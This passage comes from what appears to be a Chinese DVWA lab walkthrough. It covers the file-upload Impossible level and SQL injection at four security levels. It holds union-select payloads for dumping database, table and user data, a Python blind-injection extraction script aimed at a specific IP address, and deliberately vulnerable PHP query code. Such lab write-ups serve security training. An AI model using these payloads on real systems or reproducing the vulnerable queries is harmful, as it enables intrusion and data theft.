	<span class="token variable">$temp_file</span>    <span class="token operator">.=</span> <span class="token constant">DIRECTORY_SEPARATOR</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$uploaded_name</span> <span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">.</span> <span class="token variable">$uploaded_ext</span><span class="token punctuation">;</span>

	<span class="token comment">// Is it an image?</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token function">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'jpg'</span> <span class="token operator">||</span> <span class="token class-name">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'jpeg'</span> <span class="token operator">||</span> <span class="token class-name">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'png'</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
		<span class="token punctuation">(</span> <span class="token variable">$uploaded_size</span> <span class="token operator">&lt;</span> <span class="token number">100000</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
		<span class="token punctuation">(</span> <span class="token variable">$uploaded_type</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/jpeg'</span> <span class="token operator">||</span> <span class="token variable">$uploaded_type</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/png'</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
		<span class="token function">getimagesize</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_tmp</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>

		<span class="token comment">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_type</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/jpeg'</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
			<span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_tmp</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">imagejpeg</span><span class="token punctuation">(</span> <span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
			<span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">imagecreatefrompng</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_tmp</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">imagepng</span><span class="token punctuation">(</span> <span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token function">imagedestroy</span><span class="token punctuation">(</span> <span class="token variable">$img</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">// Can we move the file to the web root from the temp folder?</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">rename</span><span class="token punctuation">(</span> <span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token punctuation">(</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token constant">DIRECTORY_SEPARATOR</span> <span class="token operator">.</span> <span class="token variable">$target_path</span> <span class="token operator">.</span> <span class="token variable">$target_file</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
			<span class="token comment">// Yes!</span>
			<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;pre&gt;&lt;a href='${target_path}${target_file}'&gt;${target_file}&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;"</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
			<span class="token comment">// No</span>
			<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token comment">// Delete any temp files</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">file_exists</span><span class="token punctuation">(</span> <span class="token variable">$temp_file</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span>
			<span class="token function">unlink</span><span class="token punctuation">(</span> <span class="token variable">$temp_file</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
		<span class="token comment">// Invalid file</span>
		<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// Generate Anti-CSRF token</span>
<span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>在High的基础上以时间+拼接文件名进行md5加密的形式重命名文件，重点是通过imagecreatefromjpeg函数对图片的内容进行了重新处理，使得图片马中的马被去掉。</p> 
</blockquote> 
<h2><a id="_SQL_863"></a>六、 SQL注入</h2> 
<h3><a id="1Low_864"></a>1、Low</h3> 
<pre><code class="prism language-php"><span class="token number">1</span><span class="token string single-quoted-string">' union select 1,database()# 爆数据库

1'</span> union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema<span class="token operator">.</span>tables where table_schema<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#  爆表</span>

<span class="token number">1</span><span class="token string single-quoted-string">' union select 1,group_concat(column_name) from information_schema.columns where table_name='</span>users<span class="token string single-quoted-string">'# 爆字段

1'</span> union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>first_name<span class="token punctuation">)</span> from dvwa<span class="token operator">.</span>users<span class="token comment"># 爆某字段数据</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/1a/1d/ppiY4FKo_o.png" alt="在这里插入图片描述"><br> 源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Submit'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// Get input</span>
	<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'id'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

	<span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_DVWA</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SQLI_DB'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token keyword">case</span> <span class="token constant">MYSQL</span><span class="token punctuation">:</span>
			<span class="token comment">// Check database</span>
			<span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="token interpolation"><span class="token variable">$id</span></span>';"</span><span class="token punctuation">;</span>
			<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;pre&gt;'</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/pre&gt;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token comment">// Get results</span>
			<span class="token keyword">while</span><span class="token punctuation">(</span> <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
				<span class="token comment">// Get values</span>
				<span class="token variable">$first</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"first_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
				<span class="token variable">$last</span>  <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"last_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

				<span class="token comment">// Feedback for end user</span>
				<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;pre&gt;ID: <span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$id</span><span class="token punctuation">}</span></span>&lt;br /&gt;First name: <span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$first</span><span class="token punctuation">}</span></span>&lt;br /&gt;Surname: <span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$last</span><span class="token punctuation">}</span></span>&lt;/pre&gt;"</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>

			<span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
</code></pre> 
<blockquote> 
 <p>直接将输入的数据放进了数据库查询，当然也可以使用其它注入，都可以。</p> 
</blockquote> 
<h3><a id="2Medium_908"></a>2、Medium</h3> 
<pre><code class="prism language-php"><span class="token number">0</span> union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token number">0</span> union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema<span class="token operator">.</span>tables where table_schema<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  

<span class="token number">0</span> union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema<span class="token operator">.</span>columns where table_name<span class="token operator">=</span><span class="token number">0x7573657273</span> 

<span class="token number">0</span> union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>first_name<span class="token punctuation">)</span> from dvwa<span class="token operator">.</span>users 
</code></pre> 
<p>源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Submit'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// Get input</span>
	<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'id'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

	<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_DVWA</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SQLI_DB'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token keyword">case</span> <span class="token constant">MYSQL</span><span class="token punctuation">:</span>
			<span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT first_name, last_name FROM users WHERE user_id = <span class="token interpolation"><span class="token variable">$id</span></span>;"</span><span class="token punctuation">;</span>
			<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;pre&gt;'</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/pre&gt;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token comment">// Get results</span>
			<span class="token keyword">while</span><span class="token punctuation">(</span> <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
				<span class="token comment">// Display values</span>
				<span class="token variable">$first</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"first_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
				<span class="token variable">$last</span>  <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"last_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

				<span class="token comment">// Feedback for end user</span>
				<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;pre&gt;ID: <span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$id</span><span class="token punctuation">}</span></span>&lt;br /&gt;First name: <span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$first</span><span class="token punctuation">}</span></span>&lt;br /&gt;Surname: <span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$last</span><span class="token punctuation">}</span></span>&lt;/pre&gt;"</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>
</code></pre> 
<blockquote> 
 <p>虽然通过mysqli_real_escape_string()对单引号等特殊字符进行转移，但是这里用不着。</p> 
</blockquote> 
<h3><a id="3High_949"></a>3、High</h3> 
<pre><code class="prism language-php"><span class="token number">1</span><span class="token string single-quoted-string">' union select 1,database()# 爆数据库

1'</span> union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema<span class="token operator">.</span>tables where table_schema<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#  爆表</span>

<span class="token number">1</span><span class="token string single-quoted-string">' union select 1,group_concat(column_name) from information_schema.columns where table_name='</span>users<span class="token string single-quoted-string">'# 爆字段

1'</span> union select <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>first_name<span class="token punctuation">)</span> from dvwa<span class="token operator">.</span>users<span class="token comment"># 爆某字段数据</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/a7/d4/3XCFP9tN_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="4Impossible_963"></a>4、Impossible</h3> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Submit'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// Check Anti-CSRF token</span>
	<span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'user_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Get input</span>
	<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'id'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

	<span class="token comment">// Was a number entered?</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span> <span class="token variable">$id</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">intval</span> <span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_DVWA</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SQLI_DB'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
			<span class="token keyword">case</span> <span class="token constant">MYSQL</span><span class="token punctuation">:</span>
				<span class="token comment">// Check the database</span>
				<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">':id'</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_INT</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

				<span class="token comment">// Make sure only 1 result is returned</span>
				<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">rowCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
					<span class="token comment">// Get values</span>
					<span class="token variable">$first</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'first_name'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
					<span class="token variable">$last</span>  <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'last_name'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

					<span class="token comment">// Feedback for end user</span>
					<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;pre&gt;ID: <span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$id</span><span class="token punctuation">}</span></span>&lt;br /&gt;First name: <span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$first</span><span class="token punctuation">}</span></span>&lt;br /&gt;Surname: <span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$last</span><span class="token punctuation">}</span></span>&lt;/pre&gt;"</span><span class="token punctuation">;</span>
				<span class="token punctuation">}</span>
				<span class="token keyword">break</span><span class="token punctuation">;</span>
			<span class="token keyword">case</span> <span class="token constant">SQLITE</span><span class="token punctuation">:</span>
				<span class="token keyword">global</span> <span class="token variable">$sqlite_db_connection</span><span class="token punctuation">;</span>

				<span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$sqlite_db_connection</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'SELECT first_name, last_name FROM users WHERE user_id = :id LIMIT 1;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">bindValue</span><span class="token punctuation">(</span><span class="token string single-quoted-string">':id'</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">,</span><span class="token constant">SQLITE3_INTEGER</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token variable">$result</span><span class="token operator">-&gt;</span><span class="token function">finalize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
					<span class="token comment">// There is no way to get the number of rows returned</span>
					<span class="token comment">// This checks the number of columns (not rows) just</span>
					<span class="token comment">// as a precaution, but it won't stop someone dumping</span>
					<span class="token comment">// multiple rows and viewing them one at a time.</span>

					<span class="token variable">$num_columns</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-&gt;</span><span class="token function">numColumns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
					<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$num_columns</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
						<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-&gt;</span><span class="token function">fetchArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

						<span class="token comment">// Get values</span>
						<span class="token variable">$first</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'first_name'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
						<span class="token variable">$last</span>  <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'last_name'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

						<span class="token comment">// Feedback for end user</span>
						<span class="token variable">$html</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"&lt;pre&gt;ID: <span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$id</span><span class="token punctuation">}</span></span>&lt;br /&gt;First name: <span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$first</span><span class="token punctuation">}</span></span>&lt;br /&gt;Surname: <span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$last</span><span class="token punctuation">}</span></span>&lt;/pre&gt;"</span><span class="token punctuation">;</span>
					<span class="token punctuation">}</span>
				<span class="token punctuation">}</span>

				<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// Generate Anti-CSRF token</span>
<span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>将id规定为数字，并且采用了预编译防止sql注入，使得注入语句成为参数，确实防止了sql注入。</p> 
</blockquote> 
<h2><a id="SQL_1036"></a>七、SQL盲注</h2> 
<h3><a id="1Low_1037"></a>1、Low</h3> 
<pre><code class="prism language-python">

<span class="token keyword">import</span> requests

s<span class="token operator">=</span>requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
url<span class="token operator">=</span><span class="token string">'http://121.199.77.45/vulnerabilities/sqli_blind/?id='</span>
last<span class="token operator">=</span><span class="token string">'&amp;Submit=Submit#'</span>
headers<span class="token operator">=</span><span class="token punctuation">{<!-- --></span>
    <span class="token string">'Cookie'</span><span class="token punctuation">:</span><span class="token string">'PHPSESSID=bqjapbi0r6fs9aemuhkc2svn81; security=low'</span><span class="token punctuation">,</span>
    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0'</span>
<span class="token punctuation">}</span>
<span class="token comment">#proxy={'http':'http://127.0.0.1:8080'}</span>
result<span class="token operator">=</span><span class="token string">''</span>
<span class="token keyword">for</span> times <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">max</span><span class="token operator">=</span><span class="token number">128</span>
    <span class="token builtin">min</span><span class="token operator">=</span><span class="token number">0</span>
    mid<span class="token operator">=</span><span class="token punctuation">(</span><span class="token builtin">max</span><span class="token operator">+</span><span class="token builtin">min</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
    <span class="token keyword">while</span> <span class="token builtin">min</span><span class="token operator">&lt;</span><span class="token builtin">max</span><span class="token punctuation">:</span>
        url <span class="token operator">=</span> <span class="token string">'http://121.199.77.45/vulnerabilities/sqli_blind/?id='</span>
        <span class="token comment">#payload=f"1'%20and%20if((ascii(substr((select%20database())%2c{times}%2c1))%3e{mid})%2c1%2c0)%23" 爆数据库</span>
        <span class="token comment">#payload=f"1'+and+if(ascii(substr((select+group_concat(table_name)+from+information_schema.tables+where+table_schema%3Ddatabase())%2C{times}%2C1))&gt;{mid}%2C1%2C0)%23" #爆表</span>
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"1'+and+if(ascii(substr((select+group_concat(column_name)+from+information_schema.columns+where+table_name%3D'users')%2C</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>times<span class="token punctuation">}</span></span><span class="token string">%2C1))&gt;</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>mid<span class="token punctuation">}</span></span><span class="token string">%2C1%2C0)%23"</span></span> <span class="token comment">#爆字段</span>
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"1'+and+if(ascii(substr((select+group_concat(first_name)+from+dvwa.users)%2C</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>times<span class="token punctuation">}</span></span><span class="token string">%2C1))&gt;</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>mid<span class="token punctuation">}</span></span><span class="token string">%2C1%2C0)%23"</span></span> <span class="token comment">#爆数据</span>
        url<span class="token operator">=</span>url<span class="token operator">+</span>payload<span class="token operator">+</span>last
        resp<span class="token operator">=</span>s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'User ID exists in the database.'</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
